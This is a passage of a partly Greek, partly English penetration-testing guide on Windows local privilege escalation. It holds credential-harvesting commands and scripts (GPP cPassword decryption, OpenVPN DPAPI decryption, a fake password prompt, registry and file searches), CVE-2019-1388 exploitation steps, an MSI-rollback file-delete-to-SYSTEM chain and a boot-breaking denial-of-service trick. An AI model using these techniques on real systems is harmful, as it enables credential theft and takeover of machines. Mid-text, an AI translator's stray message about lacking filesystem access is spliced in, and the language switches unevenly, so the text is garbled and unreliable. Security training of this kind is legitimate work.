- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρησιμοποιώντας το crackmapexec για την απόκτηση των κωδικών:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN διαπιστευτήρια
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Καταγραφές
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε credentials

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισάγει τα credentials του ή ακόμα και τα credentials ενός διαφορετικού χρήστη** αν νομίζετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι **το να ζητήσετε** απευθείας από τον πελάτη τα **credentials** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν credentials**

Γνωστά αρχεία που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your filesystem. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or list the proposed files and their contents). Once you provide the file(s), I'll translate the English text to Greek, preserving all markdown, HTML, links, paths, tags and code as instructed.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στο RecycleBin

Πρέπει επίσης να ελέγξετε τον Κάδο για να αναζητήσετε διαπιστευτήρια μέσα σε αυτόν

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο μητρώο

**Άλλα πιθανά κλειδιά μητρώου με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό Περιηγητών

Πρέπει να ελέγξετε για dbs όπου αποθηκεύονται οι κωδικοί από **Chrome or Firefox**.\  
Επίσης ελέγξτε το ιστορικό, τα σελιδοδείκτες και τα αγαπημένα των περιηγητών ώστε ίσως κάποιοι **κωδικοί είναι** αποθηκευμένοι εκεί.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το Component Object Model (COM) είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει την αλληλεπικοινωνία μεταξύ συστατικών λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε COM component αναγνωρίζεται μέσω ενός class ID (CLSID) και κάθε component εκθέτει λειτουργίες μέσω μιας ή περισσοτέρων διεπαφών, που αναγνωρίζονται μέσω interface IDs (IIDs).

Οι COM classes και διεπαφές ορίζονται στο registry κάτω από **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται από τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be Apartment (Single-Threaded), Free (Multi-Threaded), Both (Single or Multi) or Neutral (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείτε να αντικαταστήσετε οποιαδήποτε από τις DLLs που πρόκειται να εκτελεστούν, θα μπορούσατε να ανυψώσετε προνόμια αν αυτή η DLL εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν το COM Hijacking ως μηχανισμό επιμονής, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών σε αρχεία και registry**

**Αναζήτηση περιεχομένου αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση για αρχείο με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζητήστε το μητρώο για ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα msf** plugin. Έχω δημιουργήσει αυτό το plugin για **να εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** μέσα στο θύμα.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμα εξαιρετικό εργαλείο για την εξαγωγή passwords από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** πολλών εργαλείων που αποθηκεύουν αυτά τα δεδομένα σε clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που τρέχει ως SYSTEM open a new process** (`OpenProcess()`) με **full access**. Η ίδια διεργασία **also create a new process** (`CreateProcess()`) **με low privileges αλλά κληρονομεί όλα τα open handles της κύριας διεργασίας**.\
Στη συνέχεια, αν έχετε **full access to the low privileged process**, μπορείτε να αρπάξετε το **open handle προς τη privileged process που δημιουργήθηκε** με `OpenProcess()` και να **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τμήματα κοινής μνήμης, γνωστά ως **pipes**, επιτρέπουν την επικοινωνία μεταξύ διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, επιτρέποντας σε μη σχετιζόμενες διεργασίες να μοιράζονται δεδομένα, ακόμα και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους ορισμένους ως **named pipe server** και **named pipe client**.

Όταν δεδομένα αποστέλλονται μέσω ενός pipe από έναν **client**, ο **server** που δημιούργησε το pipe έχει τη δυνατότητα να **take on the identity** του **client**, υπό την προϋπόθεση ότι έχει τα απαραίτητα δικαιώματα **SeImpersonate**. Η αναγνώριση μιας **privileged process** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε δίνει την ευκαιρία να **gain higher privileges** υιοθετώντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες εκτέλεσης τέτοιου είδους επίθεσης, χρήσιμοι οδηγοί υπάρχουν [**here**](named-pipe-client-impersonation.md) και [**here**](#from-high-integrity-to-system).

Επιπλέον, το ακόλουθο εργαλείο επιτρέπει να **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει να list και να δείτε όλα τα pipes για να βρείτε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Όταν αποκτάτε ένα shell ως χρήστης, μπορεί να υπάρχουν scheduled tasks ή άλλες διεργασίες που εκτελούνται και **pass credentials on the command line**. Το παρακάτω script καταγράφει τις command lines των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών από διεργασίες

## Από Low Priv User σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Εάν έχετε πρόσβαση στο γραφικό περιβάλλον (via console or RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις του Microsoft Windows είναι δυνατό να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία όπως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατή την κλιμάκωση προνομίων και το bypass του UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν υπάρχει ανάγκη να εγκαταστήσετε τίποτα και το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδόθηκε από Microsoft.

Κάποια από τα επηρεαζόμενα συστήματα είναι τα ακόλουθα:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια, είναι απαραίτητο να εκτελέσετε τα παρακάτω βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτή την ανάρτηση στο blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με κώδικα exploit [**διαθέσιμος εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση βασικά συνίσταται στην κατάχρηση του rollback feature του Windows Installer για να αντικαταστήσει νόμιμα αρχεία με κακόβουλα κατά τη διάρκεια της απεγκατάστασης. Για αυτό ο επιτιθέμενος πρέπει να δημιουργήσει έναν **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για να καταλάβει το φάκελο `C:\Config.Msi`, ο οποίος αργότερα θα χρησιμοποιηθεί από τον Windows Installer για να αποθηκεύει rollback αρχεία κατά την απεγκατάσταση άλλων πακέτων MSI όπου τα rollback αρχεία θα είχαν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Δημιουργήστε ένα `.msi` που εγκαθιστά ένα αβλαβές αρχείο (π.χ., `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
- Σημειώστε τον installer ως **"UAC Compliant"**, ώστε ένας **non-admin user** να μπορεί να τον τρέξει.
- Κρατήστε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Step 2: Begin Uninstall
- Απεγκαταστήστε το ίδιο `.msi`.
- Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (rollback backups).
- **Poll the open file handle** χρησιμοποιώντας `GetFinalPathNameByHandle` για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Το `.msi` περιλαμβάνει μια **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί όταν το `.rbf` έχει γραφτεί.
- Στη συνέχεια **περιμένει** ένα άλλο event πριν συνεχίσει την απεγκατάσταση.

- Step 4: Block Deletion of `.rbf`
- Όταν ληφθεί το σήμα, **ανοίξτε το `.rbf` αρχείο** χωρίς `FILE_SHARE_DELETE` — αυτό **εμποδίζει τη διαγραφή του**.
- Έπειτα **σηματοδοτήστε πίσω** ώστε η απεγκατάσταση να ολοκληρωθεί.
- Ο Windows Installer αποτυγχάνει να διαγράψει το `.rbf`, και επειδή δεν μπορεί να διαγράψει όλο το περιεχόμενο, **το `C:\Config.Msi` δεν αφαιρείται**.

- Step 5: Manually Delete `.rbf`
- Εσείς (ο επιτιθέμενος) διαγράφετε το `.rbf` αρχείο χειροκίνητα.
- Τώρα **το `C:\Config.Msi` είναι άδειο**, έτοιμο να καταληφθεί.

> Σε αυτό το σημείο, **trigger the SYSTEM-level arbitrary folder delete vulnerability** για να διαγράψετε `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Αναδημιουργήστε εσείς τον φάκελο `C:\Config.Msi`.
- Ορίστε **αδύναμα DACLs** (π.χ., Everyone:F), και **κρατήστε ένα handle ανοιχτό** με `WRITE_DAC`.

- Step 7: Run Another Install
- Εγκαταστήστε το `.msi` ξανά, με:
- `TARGETDIR`: εγγράψιμη τοποθεσία.
- `ERROROUT`: μια μεταβλητή που προκαλεί σκόπιμα αποτυχία.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να προκαλέσει **rollback** ξανά, το οποίο διαβάζει `.rbs` και `.rbf`.

- Step 8: Monitor for `.rbs`
- Χρησιμοποιήστε `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Καταγράψτε το όνομα αρχείου του.

- Step 9: Sync Before Rollback
- Το `.msi` περιέχει μια **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν το `.rbs` δημιουργηθεί.
- Έπειτα **περιμένει** πριν συνεχίσει.

- Step 10: Reapply Weak ACL
- Μετά τη λήψη του event ` .rbs created`:
- Ο Windows Installer **επαναεφαρμόζει ισχυρά ACLs** στο `C:\Config.Msi`.
- Αλλά δεδομένου ότι εξακολουθείτε να έχετε ένα handle με `WRITE_DAC`, μπορείτε **να επαναφέρετε ξανά τα αδύναμα ACLs**.

> Τα ACLs εφαρμόζονται **μόνο κατά το άνοιγμα του handle**, οπότε μπορείτε ακόμα να γράψετε στον φάκελο.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Επικαλύψτε το `.rbs` αρχείο με ένα **ψεύτικο rollback script** που λέει στον Windows να:
- Επαναφέρει το `.rbf` σας (κακόβουλη DLL) σε μια **προνομιούχα τοποθεσία** (π.χ., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Τοποθετήστε το ψεύτικο `.rbf` που περιέχει μια **κακόβουλη SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Σηματοδοτήστε το sync event ώστε ο installer να συνεχίσει.
- Μια **type 19 custom action (`ErrorOut`)** είναι ρυθμισμένη να **προκαλέσει σκόπιμα αποτυχία της εγκατάστασης** σε ένα γνωστό σημείο.
- Αυτό προκαλεί την **έναρξη του rollback**.

- Step 13: SYSTEM Installs Your DLL
- Ο Windows Installer:
- Διαβάζει το κακόβουλο `.rbs`.
- Αντιγράφει το `.rbf` DLL σας στην στοχευμένη τοποθεσία.
- Τώρα έχετε τη **κακόβουλη DLL σε μονοπάτι που φορτώνεται από SYSTEM**.

- Final Step: Execute SYSTEM Code
- Τρέξτε ένα αξιόπιστο **auto-elevated binary** (π.χ., `osk.exe`) που φορτώνει τη DLL που καταλάβατε.
- **Boom**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Η κύρια τεχνική rollback του MSI (η προηγούμενη) υποθέτει ότι μπορείτε να διαγράψετε έναν **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Αλλά τι γίνεται αν η ευπάθειά σας επιτρέπει μόνο **arbitrary file deletion**;

Μπορείτε να εκμεταλλευτείτε τα εσωτερικά του NTFS: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτή η ροή αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Έτσι, αν **διαγράψετε τη ροή `::$INDEX_ALLOCATION`** ενός φακέλου, NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε αυτό χρησιμοποιώντας τις τυπικές API διαγραφής αρχείων όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρά το ότι καλείς ένα *file* delete API, αυτό **διαγράφει τον φάκελο ολόκληρο**.

### Από Folder Contents Delete σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν σου επιτρέπει να διαγράψεις αυθαίρετα files/folders, αλλά **επιτρέπει τη διαγραφή των *contents* ενός attacker-controlled folder**;

1. Step 1: Δημιούργησε έναν bait folder και file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια privileged διαδικασία προσπαθεί να διαγράψει `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Προκαλέστε τη διαδικασία SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διαδικασία σαρώει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει το περιεχόμενό τους.
- Όταν φτάσει στο `file1.txt`, το **oplock triggers** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακινήστε το `file1.txt` αλλού
- Αυτό αδειάζει το `folder1` χωρίς να σπάσει το oplock.
- Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα απελευθερώσει το oplock πρόωρα.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει στο εσωτερικό stream του NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή του διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει `file1.txt`.
- Αλλά τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` διαγράφεται από SYSTEM.

### Από Arbitrary Folder Create σε Permanent DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **create an arbitrary folder as SYSTEM/admin** — ακόμα και αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **critical Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή συνήθως αντιστοιχεί στον kernel-mode driver `cng.sys`.
- Αν το **προ-δημιουργήσετε ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπει το φάκελο, **αποτυγχάνει να επιλύσει τον πραγματικό driver**, και **καταρρέει ή σταματά την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση**, και **δεν υπάρχει ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επισκευή εκκίνησης ή πρόσβαση στο δίσκο).


## **Από High Integrity σε SYSTEM**

### **Νέα υπηρεσία**

Αν ήδη εκτελείστε σε μια High Integrity διεργασία, η **διαδρομή προς SYSTEM** μπορεί να είναι εύκολη απλά δημιουργώντας και εκτελώντας μια νέα υπηρεσία:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Όταν δημιουργείτε ένα service binary βεβαιωθείτε ότι είναι έγκυρη υπηρεσία ή ότι το binary εκτελεί τις απαραίτητες ενέργειες αρκετά γρήγορα, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρη υπηρεσία.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για misconfigurations και sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για ορισμένες πιθανές misconfigurations και συλλογή πληροφοριών (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για misconfigurations**\
